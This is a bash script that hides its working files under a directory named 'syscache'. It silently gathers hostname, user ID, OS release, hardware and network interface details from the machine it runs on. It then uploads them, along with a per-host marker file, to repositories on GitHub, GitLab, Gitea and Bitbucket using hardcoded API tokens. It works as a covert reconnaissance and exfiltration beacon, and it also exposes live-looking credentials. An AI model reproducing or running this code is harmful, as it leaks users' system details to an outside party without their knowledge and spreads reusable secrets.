#!/bin/bash

############################################
# LOCAL FILES
############################################
USER_HOME="$HOME"
BASE_DIR="$USER_HOME/.local/share/syscache"
#BASE_DIR="$HOME/SysCache"
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit 1

NAME_FILE="$BASE_DIR/.uniq_name"
LOG_FILE="$BASE_DIR/run.log"
ERROR_LOG="$BASE_DIR/error.log"
#NAME_FILE=".uniq_name"
#LOG_FILE="run.log"
#ERROR_LOG="error.log"

touch "$LOG_FILE" "$ERROR_LOG"

# log() { echo "$(date '+%F %T') | $1" | tee -a "$LOG_FILE"; }
# err() { echo "$(date '+%F %T') | ERROR | $1" | tee -a "$ERROR_LOG"; }
log() { echo "$(date '+%F %T') | $1" >> "$LOG_FILE"; }
err() { echo "$(date '+%F %T') | ERROR | $1" >> "$ERROR_LOG"; }

############################################
# UNIQUE NAME (12 chars, FULL filename)
############################################

if [[ -f "$NAME_FILE" ]]; then
  FILE_NAME=$(cat "$NAME_FILE")
  log "Using existing filename: $FILE_NAME"
else
  BASE_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
  FILE_NAME="${BASE_NAME}.txt"
  echo "$FILE_NAME" > "$NAME_FILE"
  log "Generated new filename: $FILE_NAME"
fi

DETAIL_FILE="${FILE_NAME%.txt}2.0.txt"

############################################
# FILE CONTENTS
############################################

CONTENT_TEXT="1.1"

SYSTEM_INFO=$(cat <<EOF
Hostname      : $(hostname)
User          : $(whoami)
User ID       : $(id)
OS            : $(uname -a)

--- OS RELEASE ---
$(cat /etc/os-release 2>/dev/null)

--- CPU INFO ---
$(grep -m1 "model name" /proc/cpuinfo 2>/dev/null)

--- MEMORY ---
$(free -h 2>/dev/null)

--- DISK ---
$(df -h 2>/dev/null)

--- NETWORK ---
$(ip addr 2>/dev/null)
EOF
)

############################################
# TOKENS / CONFIG
############################################

GITHUB_TOKEN="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"
GITHUB_OWNER="mahesh97m"
GITHUB_REPO="phpcode"

GITLAB_TOKEN="glpat-DClozHjP9aOyT4xotnJs8286MQp1OmpleGs4Cw.01.120o1vpv7"
GITLAB_PROJECT_ID="77391265"
BRANCH="main"

GITEA_TOKEN="ad7ecc45d4f3f1421f62649d755df8b61a3f3c22"
GITEA_OWNER="mahesh2210m"
GITEA_REPO="mahesh2210m"

BITBUCKET_TOKEN="ATCTT3xFfGN0OfF9SvlcZ2obggrqfCavTxQPw74JL2N1eWO6IeblaWQJ51Dy21DniuZWhwRmk4x_sKaVg11x3Sx_BMR7dpyZbYcknW7I3d1Gvhn2QXOd12z54PXDAg6RQ04GTEOeK_sQ_MoKxdrccqwpWy4cWsYhEtreA7Vpcgja4ISA6d77QL4=262DE832"
BITBUCKET_WORKSPACE="mahesh2210m"
BITBUCKET_REPO="mahesh2210m"

############################################
# CHECK FUNCTION
############################################

check() {
  curl -s -o /dev/null -w "%{http_code}" "$1"
}

############################################
# CREATE FUNCTIONS
############################################

create_github() {
  local fname="$1"
  local content="$2"

  curl -s -X PUT \
    -H "Authorization: token $GITHUB_TOKEN" \
    "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$fname" \
    -d "{\"message\":\"add $fname\",\"content\":\"$(echo "$content" | base64 | tr -d '\n')\"}" \
    || err "GitHub create failed: $fname"
}

create_gitlab() {
  local fname="$1"
  local content="$2"

  # JSON-safe escape
  local safe_content
  safe_content=$(printf '%s' "$content" | sed 's/\\/\\\\/g; s/"/\\"/g')

  curl -s -X POST \
    -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"branch\": \"main\",
      \"commit_message\": \"add $fname\",
      \"content\": \"$safe_content\"
    }" \
    "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$fname" \
    || err "GitLab create failed: $fname"
}


create_gitea() {
  local fname="$1"
  local content="$2"
  local b64
  b64=$(echo -n "$content" | base64 | tr -d '\n')

  curl -s -X POST \
    -H "Authorization: token $GITEA_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"message\":\"add $fname\",
      \"content\":\"$b64\",
      \"encoding\":\"base64\",
      \"branch\":\"main\"
    }" \
    "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/contents/$fname" \
    || err "Gitea create failed: $fname"
}

create_bitbucket() {
  local fname="$1"
  local content="$2"

  curl -s -X POST \
    -H "Authorization: Bearer $BITBUCKET_TOKEN" \
    -F "branch=main" \
    -F "$fname=$content" \
    "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src" \
    || err "Bitbucket create failed: $fname"
}

############################################
# PROCESS FUNCTION
############################################

process_file() {
  local fname="$1"
  local content="$2"

  log "Processing: $fname"

  [[ $(check "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$fname") == "404" ]] \
    && create_github "$fname" "$content" || log "GitHub exists: $fname"

  [[ $(check "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$fname?ref=main") == "404" ]] \
    && create_gitlab "$fname" "$content" || log "GitLab exists: $fname"

  [[ $(check "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/contents/$fname") == "404" ]] \
    && create_gitea "$fname" "$content" || log "Gitea exists: $fname"

  [[ $(check "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src/main/$fname") == "404" ]] \
    && create_bitbucket "$fname" "$content" || log "Bitbucket exists: $fname"
}

############################################
# EXECUTION
############################################

process_file "$FILE_NAME" "$CONTENT_TEXT"
process_file "$DETAIL_FILE" "$SYSTEM_INFO"

log "✅ Script finished successfully"
